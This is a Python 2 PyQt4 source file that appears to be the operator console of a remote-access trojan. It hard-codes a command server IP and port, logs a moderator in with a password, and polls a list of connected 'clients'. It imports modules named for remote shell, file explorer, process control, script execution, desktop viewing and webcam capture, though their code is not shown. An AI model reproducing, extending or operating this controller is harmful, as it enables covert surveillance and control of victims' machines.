# -*- coding: utf-8 -*-

import sys
import socket
import os
import time
import threading
import hashlib
import string
import random

from PyQt4.QtGui import *
from PyQt4.QtCore import *

from ModeratorFactory import *
from libs import pygeoip
from libs.language import Translate
from ui import gui
from LogViewer import LogViewer
from libs.log_settings import LogSettings
from libs.settings import Config, Settings
from libs.data_transfer import data_receive, data_send, data_get
from modules.mexplorer import main as mexplorer
from modules.mshell import main as mshell
from modules.mprocesses import main as mprocesses
from modules.mscript import main as mscript
from modules.mdesktop import main as mdesktop
from modules.mwebcam import main as mwebcam

SERVER_HOST = '109.172.189.74'
SERVER_PORT = 1313

# Multi Lang
translate = Translate()
_ = lambda _word: translate.word(_word)

def id_generator(size=16, chars=string.ascii_uppercase + string.digits):
    return ''.join(random.choice(chars) for _ in range(size))

# Main Window
class MainDialog(QMainWindow, gui.Ui_MainWindow):
    def __init__(self, reactor, parent=None):
        super(MainDialog, self).__init__(parent)
        self.reactor = reactor
        self.setupUi(self)

        # Create Protocol
        self.create_moderator()

        # Init Modes
        self.modes = {
            'moderatorInitializing': self.moderatorInitializing,
        }

        # Triggers
        self.connectButton.clicked.connect(self.on_connect_to_server)

    def create_moderator(self):
        self.moderator = SocketModeratorFactory(
            self.on_client_connect_success,
            self.on_client_connect_fail,
            self.on_client_receive)


    def on_connect_to_server(self):

        self.connection = self.reactor.connectTCP(SERVER_HOST, SERVER_PORT, self.moderator)

    def on_client_connect_success(self):
        self.session_id = id_generator(size=24)
        username, ok = QInputDialog.getText(self, _('UNLOCK_CLIENT'), _('ENTER_USERNAME'), QLineEdit.Normal)
        if ok:
            password, ok = QInputDialog.getText(self, _('UNLOCK_CLIENT'), _('ENTER_PASSWORD'), QLineEdit.Password)
            if ok:
                self.moderator.send_msg('auth %s %s' % (username, password), 'moderatorInitializing', self.session_id)

    def on_client_connect_fail(self, reason):
        # reason is a twisted.python.failure.Failure  object
        print 'cann\'t connect. reason: %s' % reason

    # Callbacks
    def on_client_receive(self, data):
        if type(data) is dict:
            if self.modes.has_key(data['mode']):
                self.modes[data['mode']](data)
            else:
                print 'UNKNOWN MODE [%s]' % data['mode']

    def send_to_server(self, message):
        self.moderator.send_msg(message)

    # CALLBACKS
    # Moderator Login Callback
    def moderatorInitializing(self, data):
        """ Initializing Moderator """
        if data['payload'].startswith('loginSuccess '):
            # Get Privileges
            self.privs = int(data['payload'].split()[-1])
            if self.privs == 1: self.enable_administrator()
            else: self.disable_administrator()
            # Start Client Checker
            self.clients_checker = QTimer()
            self.clients_checker.timeout.connect(self.check_clients)
            self.clients_checker.start(3)
            # Update UI
            self.on_moderator_connected()
        else:
            # Update UI
            self.on_moderator_not_connected()
            # Warn Message
            warn = QMessageBox(QMessageBox.Warning, _('INCORRECT_CREDENTIALS'), _('INCORRECT_CREDENTIALS'))
            ans = warn.exec_()


    # Ui Functions
    # Moderator Connected Succes
    def on_moderator_connected(self):
        self.loginStatusLabel.setText(self.session_id)
        self.loginStatusLabel.setStyleSheet('color: #2ecc71')
        self.connectionStatusButton.setIcon(QIcon(QPixmap(":/icons/assets/connection.png")))
        self.connectButton.setChecked(True)

    # Moderator Connected Error
    # TODO: style
    def on_moderator_not_connected(self):
        self.loginStatusLabel.setText('Not Connected')
        self.loginStatusLabel.setStyleSheet('color: red')
        self.connectionStatusButton.setIcon(QIcon(QPixmap(":/icons/assets/no_connection.png")))
        self.connectButton.setChecked(False)

    # Enable Administrators Features
    def enable_administrator(self):
        # Online Clients Moderators
        self.clientsTable.showColumn(0)
        # Offline Clients Moderators
        self.offlineClientsTable.showColumn(0)
        # Moderators Tab
        self.clientsTabs.setTabEnabled(2, True)
        self.clientsTabs.setTabIcon(2, QIcon(QPixmap(":/icons/assets/moderators.png")))

    # Disable Administrators Features
    def disable_administrator(self):
        # Online Clients Moderators
        self.clientsTable.setColumnHidden(self.index_of_moderator, True)
        # Offline Clients Moderators
        self.offlineClientsTable.setColumnHidden(0, True)
        # Moderators Tab
        self.clientsTabs.setTabEnabled(2, False)
        self.clientsTabs.setTabIcon(2, QIcon(QPixmap(":/icons/assets/none.png")))

    # Check Clients For Updates
    def check_clients(self):
        self.moderator.send_msg(message='getClients', mode='getClients', session_id=self.session_id)

#-------------------------------------------------------------------------------
if __name__ == "__main__":
    app = QApplication(sys.argv)
    try:
        import qt4reactor
    except ImportError:
        from twisted.internet import qt4reactor
    qt4reactor.install()

    from twisted.internet import reactor
    moderatWindow = MainDialog(reactor)
    moderatWindow.show()

    reactor.run()